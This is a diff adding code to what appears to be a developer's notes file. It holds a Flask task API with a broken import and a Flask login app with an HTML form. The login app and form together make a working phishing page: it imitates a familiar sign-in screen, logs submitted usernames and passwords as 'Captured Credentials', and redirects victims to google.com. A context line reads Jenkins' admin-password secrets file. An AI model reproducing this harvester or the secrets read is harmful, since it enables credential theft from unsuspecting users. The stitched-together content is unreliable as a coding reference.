@@ -12,3 +12,88 @@ cat /var/lib/jenkins/secrets/initialAdminPassword
 
 var usernameRegex = /^[A-Za-z]{1,20}$/;
 var passwordRegex = /^[A-Za-z0-9]{1,15}$/;
+
+
+from Flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+tasks = [
+    {"id": 1, "title": "Task 1", "description": "Description for Task 1", "completed": False},
+    {"id": 2, "title": "Task 2", "description": "Description for Task 2", "completed": True},
+]
+
+@app.route('/get-all-tasks', methods=['GET'])
+def get_all_tasks():
+    return jsonify(tasks), 200
+
+@app.route('/get-task/<int:task_id>', methods=['GET'])
+def get_task(task_id):
+    task = next((task for task in tasks if task["id"] == task_id), None)
+    if task:
+        return jsonify(task), 200
+    else:
+        return jsonify({"error": "Task not found"}), 404
+
+@app.route('/add-task', methods=['POST'])
+def add_task():
+    new_task = request.get_json()
+    new_task["id"] = len(tasks) + 1
+    tasks.append(new_task)
+    return jsonify(new_task), 201
+
+@app.route('/update-task/<int:task_id>', methods=['PUT'])
+def update_task(task_id):
+    task = next((task for task in tasks if task["id"] == task_id), None)
+    if task:
+        updated_data = request.get_json()
+        task.update(updated_data)
+        return jsonify(task), 200
+    else:
+        return jsonify({"error": "Task not found"}), 404
+    
+@app.route('/delete-task/<int:task_id>', methods=['DELETE'])
+def delete_task(task_id):
+    global tasks
+    tasks = [task for task in tasks if task["id"] != task_id]
+    return jsonify({"message": "Task deleted"}), 200
+
+if __name__ == '__main__':
+    app.run()
+
+
+
+from flask import Flask, render_template, request, redirect, url_for
+import json
+
+app = Flask(__name__)
+credentials = []  # In-memory store (for demo only)
+
+@app.route('/')
+def login_page():
+    return render_template('login.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    credentials.append({'username': username, 'password': password})
+    print("Captured Credentials:", json.dumps(credentials, indent=2))
+
+    return redirect('https://www.google.com')  # Redirect after "error"
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+<body>
+  <div class="login-card">
+    <h2>Sign In</h2>
+    <form method="POST" action="/login">
+      <input type="text" name="username" placeholder="Email or phone" required />
+      <input type="password" name="password" placeholder="Enter your password" required />
+      <button type="submit">Next</button>
+    </form>
+  </div>
+</body>
